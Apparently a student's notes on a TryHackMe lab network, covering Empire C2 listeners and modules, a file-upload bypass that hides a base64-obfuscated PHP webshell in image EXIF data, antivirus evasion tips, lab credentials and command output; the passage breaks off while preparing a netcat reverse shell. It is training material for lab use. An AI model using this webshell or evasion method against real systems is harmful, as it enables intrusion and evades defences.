@@ -3075,3 +3075,1029 @@ Specifically we need:-
 When filled in, our options should look something like this:
 ![Showing the full options for the hop_listener when set. Also executing the listener.](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/0a85d9e55345.png)
 As shown in the screenshot, we then once again use `execute` to start the listener.
+This will have written a variety of files into a new `http_hop` directory in `/tmp` of our attacking machine. We will need to replicate this file structure on our jump server (the compromised `.200` webserver) when we serve the files. Notice that these files (`news.php`, `admin/get.php`, and `login/process.php`) would not look out of place amongst genuine web application files -- and indeed could easily be discretely merged into an existing webapp.
+---
+Let's look at setting up a `http_hop` listener in Starkiller.
+By this stage you should be fairly familiar with this process, so we will go through this quickly.
+Switch back to the Listeners menu in Starkiller using the menu at the left-hand side of the screen:
+![Showing the listeners menu in Starkiller again](https://assets.tryhackme.com/additional/wreath-network/fed6f29eee3a.png)
+Create a new listener and choose "http_hop" for the type. We then fill in the options much like with the Empire CLI Client:
+![Filling in the options for the http_hop listener in Starkiller](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/c7a7339d03cb.png)
+Again, we set the **Host** (`.200`), **Port**, and **RedirectListener**.
+_**Note:** if you also have a Hop Listener set up using the Empire CLI then you should also change the OutFolder to avoid overwriting the previously generated files._
+Click "Submit", and the listener starts!
+Answer the questions below
+Create a `http_hop` listener in Empire CLI and/or Starkiller.
+Completed
+### Task 30  Command and Control Empire: Modules
+[**Video**](https://youtu.be/ICYUaPShHKQ)
+As mentioned previously, modules are used to perform various tasks on a compromised target, through an active Empire agent. For example, we could use Mimikatz through its Empire module to dump various secrets from the target.
+As per usual, let's look at loading modules in both Empire CLI and Starkiller.
+---
+Starting with Empire CLI:
+Inside the context of an agent, type `usemodule`. As expected, this will show a dropdown with a huge list of modules which can be loaded into the agent for execution.
+It doesn't really matter here as we already have full access to the target, but for the sake of learning, let's try loading in the Sherlock Empire module. This checks for potential privilege escalation vectors on the target.
+`usemodule powershell/privesc/sherlock`
+![Demonstration of loading the sherlock module](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/081792f6213e.png)
+As previously, we can use `options` to get information about the module after loading it in.
+This module requires one option to be set: the `Agent` value. This is already set for us here; however, if it was incorrect or there was no option set already then we could set it using the command: `set Agent AGENT_NAME`, (the same syntax as in previous parts of the framework).
+We start the module using the usual `execute` command. The module will then run as a background job, returning the results when it completes.
+![Executing the module in Empire CLI Client](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/8ec5020e81a2.png)
+If we know approximately what we want to do, but don't know the exact path to a module, we can just type `usemodule NAME_OF_MODULE` and it should come up in the dropdown menu:
+![Demonstrating searching for modules using the dropdown menu](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/02eba19664ee.png)
+---
+Now let's do the same thing in Starkiller.
+First we switch over to the modules menu:
+![Showing the modules menu in Starkiller](https://assets.tryhackme.com/additional/wreath-network/43556845ab7b.png)
+In the top right corner we can search for our desired module. Let's search for the Sherlock module again:
+![Demonstrating the search function at the top right of the Starkiller Modules interface](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ec88bc6ff7b5.png)
+Select the module by clicking on its name.
+From here we click on the Agents menu, then select the agent(s) to use the module through:
+![Demonstrating what adding an agent looks like in Starkiller](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/fc2e34bbfd15.png)
+Click Submit to run the module!
+To view the results we need to switch over to the "Reporting" section of the main menu on the left side of the window:
+![Showing the reporting tab found in the left hand menu of Starkiller](https://assets.tryhackme.com/additional/wreath-network/f8553e45f903.png)
+From here we can see the task we just ran, showing the Agent in use, the event type, command, user, and a timestamp.
+![Highlighting the down arrow used to show the task results in the reporting section](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/f57165fc44fc.png)
+Clicking on the dropdown arrow to the left of the task gives the task results:
+![Demonstration of possible task results from a finished task in Starkiller](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/213d58186b7f.png)
+Answer the questions below
+Read the above information and try to experiment with the Empire Modules available.
+Completed
+### Task 31  Command and Control Empire: Interactive Shell
+[**Video**](https://youtu.be/u_yJh4fnwXo)
+The interactive shell was a new feature in Empire 4.0. It effectively allows you to access a traditional pseudo-command shell from within Starkiller or the Empire CLI Client. This can be used to execute PowerShell commands, as you would in a Powershell reverse shell.
+To access the interactive shell in the Empire CLI Client, we can use the `shell` command from within the context of an agent:
+![Demonstration of using the shell command to drop into an interactive shell in the Empire Client CLI](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/a864fce42efc.png)
+In Starkiller this is even easier as the shell can be found directly in the Agent interaction interface:
+![](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/c1b8fc62f751.png)
+Whilst not quite as "familiar" as the command line shell, this gives us the exact same access.
+Answer the questions below
+Find and use the interactive shell in both the Empire CLI Client and in Starkiller.
+Completed
+### Task 32  Command and Control Conclusion
+[**Video**](https://youtu.be/u_yJh4fnwXo)
+We have now covered the fundamentals of working with a command and control framework. Empire is significantly more extensive than the basics we have looked at in the time and space available here, so it's well worth doing some more research on it in your own time!
+The overarching take-aways from this section are:
+- C2 Frameworks are used to consolidate access to a compromised machine, as well as streamline post-exploitation attempts
+- There are many C2 Frameworks available, so look into which ones work best for your use case
+- Empire is a good choice as a relatively well-rounded, open source C2 framework
+- Empire is still in active development, with upgrades and new features being released frequently
+- Starkiller is a GUI front-end for Empire which makes collaboration using the framework very easy
+This has very much been a whistle-stop tour of both the Empire framework and the topic in general, but hopefully it has been useful nonetheless.
+Answer the questions below
+Read the C2 Conclusion
+Completed
+**[Bonus Exercise]** Try working through this section again, using a different C2 Framework of your choice. You can use the C2 matrix to help with this.
+Completed
+[**Video**](https://youtu.be/EFBbGMW9Kso)
+Ok, so we know what is likely to happen when we access this page:
+- It will probably ask us for creds
+- We'll be able to upload image files
+- There are two filters in play to stop us from uploading other kinds of files
+- Both of these filters can be bypassed
+Perfect -- let's access the page!
+Answer the questions below
+```text
+thomas: i<3ruby
+
+uploading img http://10.200.87.100/resources/uploads/corgo2.jpg
+
+┌──(witty㉿kali)-[~]
+└─$ cp /home/witty/corgo2.jpg test-witty.jpeg.php
+
+┌──(witty㉿kali)-[~]
+└─$ exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-witty.jpeg.php
+
+    1 image files updated
+                                                                     
+┌──(witty㉿kali)-[~]
+└─$ exiftool test-witty.jpeg.php
+ExifTool Version Number         : 12.57
+File Name                       : test-witty.jpeg.php
+Directory                       : .
+File Size                       : 43 kB
+File Modification Date/Time     : 2023:06:16 13:51:54-04:00
+File Access Date/Time           : 2023:06:16 13:51:54-04:00
+File Inode Change Date/Time     : 2023:06:16 13:51:54-04:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Profile CMM Type                : Little CMS
+Profile Version                 : 2.1.0
+Profile Class                   : Display Device Profile
+Color Space Data                : RGB
+Profile Connection Space        : XYZ
+Profile Date Time               : 2012:01:25 03:41:57
+Profile File Signature          : acsp
+Primary Platform                : Apple Computer Inc.
+CMM Flags                       : Not Embedded, Independent
+Device Manufacturer             : 
+Device Model                    : 
+Device Attributes               : Reflective, Glossy, Positive, Color
+Rendering Intent                : Perceptual
+Connection Space Illuminant     : 0.9642 1 0.82491
+Profile Creator                 : Little CMS
+Profile ID                      : 0
+Profile Description             : c2
+Profile Copyright               : FB
+Media White Point               : 0.9642 1 0.82491
+Media Black Point               : 0.01205 0.0125 0.01031
+Red Matrix Column               : 0.43607 0.22249 0.01392
+Green Matrix Column             : 0.38515 0.71687 0.09708
+Blue Matrix Column              : 0.14307 0.06061 0.7141
+Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
+Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
+Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
+Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
+Image Width                     : 800
+Image Height                    : 533
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 800x533
+Megapixels                      : 0.426
+
+http://10.200.87.100/resources/uploads/test-witty.jpeg.php
+
+Test Payload
+```
+Let's head to the `/resources` directory.
+As expected, we are met with a request for authentication:
+![Request for credentials](https://assets.tryhackme.com/additional/wreath-network/7b8a8b3287a7.png)
+We can assume that the username here is _probably_ either `Thomas` or `twreath` -- both of which we have already seen. We also already have one of Thomas' passwords, stolen from the Git Server using Mimikatz.
+See if you can login using these usernames with that password!
+Question Done
+Success!
+![Upload portal in the hidden page](https://assets.tryhackme.com/additional/wreath-network/5898d52a643f.png)
+How cute -- a page to allow Thomas to upload pictures of his beloved cat, Ruby.
+Try uploading a legitimate image -- see if you can access it!
+Read the previous task if you can't remember where uploaded images go, and how they are named. You will need to use the absolute URI to access the file, as the subdirectory containing uploaded files is not indexable.
+Completed
+We already know how to bypass the first filter -- simply changing the extension to `.jpeg.php` should be enough.
+The second filter is slightly harder, but doable.
+As the `getimagesize()` function is checking for attributes that only an image will have, we need to give it what it wants: an image.
+In other words, we need to upload a genuine image file which contains a PHP webshell _somewhere_. If this file has a `.php` file extension then it will be executed by the website as a PHP file, meaning all we need to do is force a webshell into the file and we're golden.
+The easiest place to stick the shell is in the exifdata for the image -- specifically in the `Comment` field to keep it nicely out of the way.
+Take a regular image (i.e. download a jpeg of your choice off the internet, keeping it safe for work) and rename it to `test-USERNAME.jpeg.php`, substituting in your own TryHackMe username.
+We can then use `exiftool` to check the exifdata of the file:
+`exiftool IMAGE_NAME`
+![Checking the exif-data of the image -- nothing of note yet](https://assets.tryhackme.com/additional/wreath-network/a34cd3bc4060.png)
+_**Note:** you may need to install exiftool before use (__`sudo apt install exiftool`)._
+Here we can see all of the exifdata for the image. Exiftool also allows us to edit this information, which makes it a great choice for the exploit we're going to carry out.
+Before we actually start inserting payloads into the image, however, there is one more thing to take into account. There is antivirus software running on this target. We don't know which AV Thomas uses, but we know that there will be protections enabled on this target. We don't know how strict the Antivirus software he uses is -- for all we know it will pick up any kind of default PHP webshell that we upload, alerting him to how close we are to compromising his host. It might not, but why take the chance? For this reason we will not be uploading a live payload in this task. Instead we will create a proof of concept here, then upload a live payload when we have completed the PHP Obfuscation task in the AV Evasion section of the network.
+Bearing this in mind, let's create our PoC!
+We'll be using the following PHP payload for this:
+`<?php echo "<pre>Test Payload</pre>"; die();?>   `
+This is completely harmless and ergo should not get picked up by the AV. It does give us confirmation that this is likely to work, however, and stages the way for the actual webshell upload.
+To add this to our image we once again use exiftool:
+`exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-USERNAME.jpeg.php   `
+![Exif data with the payload added in the comment](https://assets.tryhackme.com/additional/wreath-network/7fe0d0d6ee10.png)
+Now try uploading the file and accessing it in your browser!
+![Screenshot of the payload successfully activating](https://assets.tryhackme.com/additional/wreath-network/90b4465363db.png)
+_**Note:** The HTML form is configured to only allow image uploads through the GUI, so don't be alarmed if you don't see your script in your working directory. Just change "All Supported Types" at the bottom right of the Window to "All Files":
+_![File manager with All Supported Types highlighted](https://assets.tryhackme.com/additional/wreath-network/ec93f0bc06f9.png)
+![File manager after changing the type to All Files](https://assets.tryhackme.com/additional/wreath-network/f74dbe5147a5.png)
+We have the ability to execute arbitrary PHP code on the system!
+Completed
+### Task 38  AV Evasion Introduction
+[**Video**](https://youtu.be/2PXuha963-I)
+Antivirus Evasion is the third and final primary teaching point of the Wreath network.
+By nature, AV Evasion is a rapidly changing topic. It's a constant dance between hackers and developers. Every time the developers release a new feature, the hackers develop a way around it. Every time the hackers bypass a new feature, the developers release another feature to close off the exploit, and so the cycle continues. Due to the speed of this process, it is nigh impossible to teach bleeding-edge techniques (and expect them to stay relevant for any length of time), so we are only going to be covering the fundamentals of the topic here. Without further ado, let's dive in!
+---
+When it comes to AV evasion we have two primary types available:
+- On-Disk evasion
+- In-Memory evasion
+On-Disk evasion is when we try to get a file (be it a tool, script, or otherwise) saved on the target, then executed. This is very common when working with executable (`.exe`) files.
+In-Memory evasion is when we try to import a script directly into memory and execute it there. For example, this could mean downloading a PowerShell module from the internet or our own device and directly importing it without ever saving it to the disk.
+In ages past, In-Memory evasion was enough to bypass most AV solutions as the majority of antivirus software was unable to scan scripts stored in the memory of a running process. This is no longer the case though, as Microsoft implemented a feature called the **A**nti-**M**alware **S**can **I**nterface (AMSI). AMSI is essentially a feature of Windows that scans scripts as they enter memory. It doesn't actually check the scripts itself, but it does provide hooks for AV publishers to use -- essentially allowing existing antivirus software to obtain a copy of the script being executed, scan it, and decide whether or not it's safe to execute. Whilst there are various bypasses for this (often involving tricking AMSI into failing to load), these are out of scope for this room.
+In terms of methodology: ideally speaking, we would start by attempting to fingerprint the AV on the target to get an idea of what solution we're up against. As this is often an interactive (social-engineering reliant) process, we will skip it for now and assume that the target is running the default Windows Defender so that we can get straight into the meat of the topic. If we already have a shell on the target, we may also be able to use programs such as [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker) and [Seatbelt](https://github.com/GhostPack/Seatbelt) to identify the antivirus solution installed. Once we know the OS version and AV of the target, we would then attempt to replicate this environment in a virtual machine which we can use to test payloads against. Note that we should _always_ disable any kind of cloud-based protection in the AV settings (potentially by outright disconnecting the VM from the internet) so that the AV doesn't upload our carefully crafted payloads to a server somewhere for analysis, destroying all our hard work. Once we have a working payload, we can then deploy it against the target!
+AV Evasion usually involves some form of obfuscation when it comes to payloads. This could mean anything from moving things around in the exploit and changing variable names, to encoding aspects of the script, to outright encrypting the payload and writing a wrapper to decrypt and execute the code section-by-section. The aim is to switch things enough that the AV software is unable to detect anything bad.
+Answer the questions below
+Which category of evasion covers uploading a file to the storage on the target before executing it?
+*On-Disk Evasion*
+What does AMSI stand for?
+*Anti-Malware Scan Interface*
+Which category of evasion does AMSI affect?
+*In-Memory Evasion*
+### Task 39  AV Evasion AV Detection Methods
+[**Video**](https://youtu.be/KHUQWshXcjc)
+Before we get into the practical side of things, let's talk a little about the different detection methods employed by antivirus software.
+Generally speaking, detection methods can be classified into one of two categories:
+- Static Detection
+- Dynamic / Heuristic / Behavioural Detection
+Modern Antivirus software will usually rely on a combination of these.
+---
+Static detection methods usually involve some kind of signature detection. A very rudimentary system, for example, would be taking the hashsum of the suspicious file and comparing it against a database of known malware hashsums. This system does tend to be used; however, it would never be used by itself in modern antivirus solutions. For this reason it's usually a good idea to change _something_ when working with a known exploit. The smallest change to the file will result in a completely different hashsum, so even something as small as changing a string in the help message would be enough to bypass this kind of rudimentary detection system.
+Fortunately (or unfortunately for us as hackers), this is usually nowhere near enough to bypass static detection methods.
+The other form of static detection which is often used in antivirus software (to much greater effect) is a technique called Byte (or string) matching.![](https://assets.tryhackme.com/additional/wreath-network/MDliMWY4MjNl.png) Byte matching is another form of signature detection which works by searching through the program looking to match sequences of bytes against a known database of bad byte sequences. This is much more effective than just hashing the entire file! Of course, it also means that we (as hackers) have a much harder job tracking down the exact line of code responsible for the flag.
+The tradeoff with this method is, of course, speed. Checking small sequences of bytes against a potentially huge program with multiple libraries can take a comparatively long time compared to the milliseconds it would take to hash the entire file and compare the hash against a database. As such, a compromise is sometimes made whereby the AV program hashes small sections of the file to check against the database, rather than hashing the entire thing. This obviously reduces the effectiveness of the technique, but does increase the speed somewhat.
+---
+Where static virus malware detection methods look at the file itself, dynamic methods look at how the file _acts._ There are a couple of ways to do this.
+1. AV software can go through the executable line-by-line checking the flow of execution. Based on _pre-defined rules_ about what type of action is malicious (e.g. is the program reaching out to a known bad website, or messing with values in the registry that it shouldn't be?), the AV can see how the program _intends_ to act, and make decisions accordingly
+2. The suspicious software can outright be executed inside a sandbox environment under close supervision from the AV software. If the program acts maliciously then it is quarantined and flagged as malware
+![](https://assets.tryhackme.com/additional/wreath-network/YzZkODljOGJm.png)Evading these measures is still perfectly possible, although a lot harder than evading static detection techniques. Sandboxes tend to be relatively distinctive, so we just need to look for various system values (e.g. is there a fan installed, is there a GUI, and if so, what resolution is it, are there any distinctive tools or services running -- `VMtools` for VMware virtual machines, for example) and check to see if there are any red flags. For example, a machine with no fan, no GUI and a classic VM service running is very likely to be a sandbox -- in which case the program should just exit. If the program exits without doing anything malicious then the AV software is fooled into believing that it's safe and allows it to be executed on the target.
+Equally, with logic-flow analysis, the AV software is still only working with a set of rules to check malicious behaviour. If the malware acts in a way that is unexpected (e.g. has some random code that does the grand sum of nothing inserted into the exploit) then it will likely pass this detection method.
+In addition to this, when working with certain kinds of delivery methods, password protecting the file can get straight around the behavioural analysis checks as (unlike the user who knows the password), the AV software is unable to open and execute the file.
+That said, dynamic detection methods are usually a lot more effective than static methods. The drawback is, once again, the time and resources required to spin up a VM to analyse the file in, or go through it line-by-line to see if it's doing anything malicious. These are actions that take time (causing users to grow impatient), and use up a lot of the computer's available resources. Once again the AV has to compromise, using a combination of dynamic and static analysis when scanning a file.
+---
+To make life harder still, antivirus vendors are usually in close contact with one another -- as well as with scanning sites such as [VirusTotal](https://www.virustotal.com/). When the AV detects a suspicious file, it usually sends the file back to servers owned by the provider where it gets analysed and shared with other providers. What this means is that once our payload is detected on one computer, the chances are that it will quickly be taken apart and shielded against. This rapid sharing of information allows AV providers to stay ahead of bad actors (a good thing), but also obviously adds an extra complication into our job as Ethical Hackers.
+Additionally, new techniques are being developed all the time. For example, many attempts are being made to use machine learning techniques to dynamically update the list of bad behaviours in a sandbox environment, or the rule-lists used in logic-flow analysis of a suspicious file. If you're interested in some of the work being done in this area, TryHackMe's very own [CMNatic](https://cmnatic.co.uk/) did his dissertation on the subject, which can be read [here](https://resources.cmnatic.co.uk/Presentations/Dissertation/).
+Answer the questions below
+What other name can be used for Dynamic/Heuristic detection methods?
+Dynamic, Heuristic, and..?
+*Behavioural*
+If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?
+*Static*
+When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?
+Take the answer from the task -- the answer is in italics.
+*Pre-defined rules*
+What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?
+This only works with certain delivery methods, if you can trick a user into opening/executing the file.
+*Password*
+### Task 40  AV Evasion PHP Payload Obfuscation
+[**Video**](https://youtu.be/5qA7stuTa5U)
+Now that we've covered the basic terminology, let's get back to hacking this PC!
+We have an upload point which we can use to upload PHP scripts. We now need to figure out how to make a PHP script that will bypass the antivirus software. Windows Defender is free and comes pre-installed with Windows Server, so let's assume that this is what is in use for the time being.
+The solution is this:
+We build a payload that does what we need it to do (preferably in a slightly less than common way), then we obfuscate it either manually or by using one of the many tools available online.
+First up, let's build that payload:
+`<?php       $cmd = $_GET["wreath"];       if(isset($cmd)){           echo "<pre>" . shell_exec($cmd) . "</pre>";       }       die();   ?>`
+Here we check to see if a GET parameter called "wreath" has been set. If so, we execute it using `shell_exec()`, wrapped inside HTML `<pre>` tags to give us a clean output. We then use `die()` to prevent the rest of the image from showing up as garbled text on the screen.
+This is slightly longer than the classic PHP one-liner webshell (`<?php system($_GET["cmd"]);?>`) for two reasons:
+1. If we're obfuscating it then it will become a one-liner anyway
+2. Anything _different_ is good when it comes to AV evasion
+We now need to obfuscate this payload.
+There are a variety of measures we could take here, including but not limited to:
+- Switching parts of the exploit around so that they're in an unusual order
+- Encoding all of the strings so that they're not recognisable
+- Splitting up distinctive parts of the code (e.g. `shell_exec($_GET[...])`)
+Answer the questions below
+```text
+┌──(witty㉿kali)-[~]
+└─$ exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-witty.jpeg.php
+    1 image files updated
+                                                                                   
+┌──(witty㉿kali)-[~]
+└─$ exiftool shell-witty.jpeg.php
+ExifTool Version Number         : 12.57
+File Name                       : shell-witty.jpeg.php
+Directory                       : .
+File Size                       : 43 kB
+File Modification Date/Time     : 2023:06:17 15:22:52-04:00
+File Access Date/Time           : 2023:06:17 15:22:52-04:00
+File Inode Change Date/Time     : 2023:06:17 15:22:52-04:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Profile CMM Type                : Little CMS
+Profile Version                 : 2.1.0
+Profile Class                   : Display Device Profile
+Color Space Data                : RGB
+Profile Connection Space        : XYZ
+Profile Date Time               : 2012:01:25 03:41:57
+Profile File Signature          : acsp
+Primary Platform                : Apple Computer Inc.
+CMM Flags                       : Not Embedded, Independent
+Device Manufacturer             : 
+Device Model                    : 
+Device Attributes               : Reflective, Glossy, Positive, Color
+Rendering Intent                : Perceptual
+Connection Space Illuminant     : 0.9642 1 0.82491
+Profile Creator                 : Little CMS
+Profile ID                      : 0
+Profile Description             : c2
+Profile Copyright               : FB
+Media White Point               : 0.9642 1 0.82491
+Media Black Point               : 0.01205 0.0125 0.01031
+Red Matrix Column               : 0.43607 0.22249 0.01392
+Green Matrix Column             : 0.38515 0.71687 0.09708
+Blue Matrix Column              : 0.14307 0.06061 0.7141
+Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
+Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
+Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
+Comment                         : <?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>
+Image Width                     : 800
+Image Height                    : 533
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 800x533
+Megapixels                      : 0.426
+
+http://10.200.87.100/resources/uploads/shell-witty.jpeg.php?wreath=systeminfo
+
+Host Name:                 WREATH-PC
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00429-70000-00000-AA778
+Original Install Date:     08/11/2020, 14:55:50
+System Boot Time:          17/06/2023, 19:37:34
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Xen 4.11.amazon, 24/08/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-gb;English (United Kingdom)
+Input Locale:              en-gb;English (United Kingdom)
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     2,048 MB
+Available Physical Memory: 1,177 MB
+Virtual Memory: Max Size:  2,432 MB
+Virtual Memory: Available: 1,667 MB
+Virtual Memory: In Use:    765 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 5 Hotfix(s) Installed.
+                           [01]: KB4580422
+                           [02]: KB4512577
+                           [03]: KB4580325
+                           [04]: KB4587735
+                           [05]: KB4592440
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: AWS PV Network Device
+                                 Connection Name: Ethernet
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.200.87.1
+                                 IP address(es)
+                                 [01]: 10.200.87.100
+                                 [02]: fe80::384e:59d8:4f01:974d
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+http://10.200.87.100/resources/uploads/shell-witty.jpeg.php?wreath=whoami
+
+wreath-pc\thomas
+```
+Manual obfuscation is very much a thing, but for the sake of simplicity, let's just use one of the available online tools. The tool linked [here](https://www.gaijin.at/en/tools/php-obfuscator) is recommended. When it comes to web obfuscation, these tools are generally used to make the code difficult for humans to read; however, by doing things like obfuscating variable/function names and encoding strings, they also prove effective against antivirus software.
+Stick the payload into the tool, then activate all the obfuscation options:
+![Obfuscator with the payload input and all options set](https://assets.tryhackme.com/additional/wreath-network/bb2ef4375625.png)
+Click the "Obfuscate Source Code" button, and we're left with this mess of PHP:
+`<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>`
+If you look closely you'll see that this is still very much the same payload as before; however, enough has changed that it _should_ fool Defender.
+As this is getting passed into a bash command, we will need to escape the dollar signs to prevent them from being interpreted as bash variables. This means our final payload is as follows:
+`<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>`
+Question Done
+With an obfuscated payload, we can now finalise our exploit.
+Once again, make a copy of an innocent image (ensuring you give it a name in the format of `shell-USERNAME.jpeg.php`), then use `exiftool` to embed the payload into the image:
+`exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-USERNAME.jpeg.php   `
+![Screenshot showing the insertion of the obfuscated webshell into the image with exiftool](https://assets.tryhackme.com/additional/wreath-network/98a8bd99378c.png)
+Completed
+Upload your shell and attempt to access it!
+If this worked then you should get an output similar to the following:
+![Screenshot showing an error message received when loading the webshell without a parameter](https://assets.tryhackme.com/additional/wreath-network/6b09145ae074.png)
+Completed
+Awesome! We have a shell.
+We can now execute commands using the `wreath` GET parameter, e.g:
+`http://10.200.72.100/resources/uploads/shell-USERNAME.jpeg.php?wreath=systeminfo`
+![Demonstration of executing the systeminfo command through the webshell](https://assets.tryhackme.com/additional/wreath-network/2920fdb4cd18.png)
+---
+What is the Host Name of the target?
+*WREATH-PC*
+What is our current username (include the domain in this)?
+*wreath-pc\thomas*
+### Task 41  AV Evasion Compiling Netcat & Reverse Shell!
+[**Video**](https://youtu.be/aIkOMYVVYws)
+Our webshell is all well and good, but let's go for a full reverse shell!
+Unfortunately, we have a problem. Unlike in Linux where there are usually many ways to obtain a reverse shell, the options in Windows are a lot fewer in number as Windows tends not to have many scripting languages installed by default.
+Realistically we have several options here:
+- Powershell tends to be the go-to for Windows reverse shells. Unfortunately Defender knows exactly what PowerShell reverse shells look like, so we'd have to do some serious obfuscation to get this to work.
+- We could try to get a PHP reverse shell as we know the target has a PHP interpreter installed. Windows PHP reverse shells tend to be iffy though, and again, may trigger Defender.
+- We could generate an executable reverse shell using msfvenom, then upload and activate it using the webshell. Again, msfvenom shells tend to be very distinctive. We could use the [Veil Framework](https://www.veil-framework.com/) to give us a meterpreter shell executable that might bypass Defender, but let's try to keep this manual for the time. Equally, [shellter](https://www.shellterproject.com/) (though old) might give us what we need. There are easier options though.
+- We could upload netcat. This is the quick and easy option.
+The only problem with uploading netcat is that there are hundreds of different variants -- the version of netcat for Windows that comes with Kali is known to Defender, so we're going to need a different version. Fortunately there are many floating around! Let's use one from github, [here](https://github.com/int0x33/nc.exe/).
+Clone the repository:
+`git clone https://github.com/int0x33/nc.exe/`
+This repository already contains pre-compiled netcat binaries for both 32 and 64 bit systems, however, this is an ideal time to talk about cross-compilation techniques. If you'd prefer to just use the default binaries then just skip to the last section of this task and use the `nc64.exe` binary from the repository.
+---
+Cross compilation is an essential skill -- although in many ways it's preferable to avoid it.
+First up: what is cross compilation? The idea is to compile source code into a working program to run on a different platform. In other words, cross compilation would allow us to compile a program for a different Linux kernel, a Windows program on Kali (as we're doing here), or even software for an embedded device or phone.
+Whilst cross-compilation is a very useful skill to have, it's often difficult to get completely correct. Ideally we should always try to compile our code in an environment as close to the target environment as possible. For example, if an exploit or program is designed to work on CentOS 7.2, we should try to compile it in a CentOS 7.2 VM if possible. Equally, it's essential that we get the same arch as that of the target -- a 64 bit program won't work very well on a 32 bit target!
+Sometimes it's easiest to just cross-compile, however. Generally speaking we cross compile x64 Windows programs on Kali using the `mingw-w64` package (for x64 systems). This is not installed on Kali by default, however it is available in the Kali apt repositories:
+`sudo apt install mingw-w64`
+This is a big package, but once it's installed we can start re-compiling netcat.
+Much like we use `gcc` to compile binaries on Linux, we can use the `mingw` compilers to compile Windows binaries. These tend to have very descriptive (read: long) names, but the one that's of particular importance to us here is `x86_64-w64-mingw32-gcc`. This specifies that we want to compile a 64bit binary.
+Inside the nc.exe repository we downloaded, delete or move the two pre-compiled netcat binaries. The repository provides a makefile which we can use (with some small alterations) to compile the binary. Open up the `Makefile` with your favourite text editor. The first two lines specify which compiler to use:
+![The first two lines of the Makefile at their default](https://assets.tryhackme.com/additional/wreath-network/499921a44689.png)
+Neither of these are quite what we're looking for, so comment out the first line and add another line underneath:
+`CC=x86_64-w64-mingw32-gcc`
+![The first (now three) lines of the makefile after commenting out the first line and adding in the correct compiler on line three](https://assets.tryhackme.com/additional/wreath-network/d71f7f2fcb0e.png)
+Now when we run `make` to build the binary, the correct compiler will be used to generate a x64 Windows executable. Note that there will be a lot of warnings generated by the compiler (these have been redirected to `/dev/null` in the following screenshot for readability, however, you do not need to do this). These are nothing to worry about; the compilation should still be successful.
+![Demonstrating the compilation process using the make command](https://assets.tryhackme.com/additional/wreath-network/b29a99fd33fd.png)
+Answer the questions below
+```text
+http://10.200.87.100/resources/uploads/shell-witty.jpeg.php?wreath=certutil.exe
+
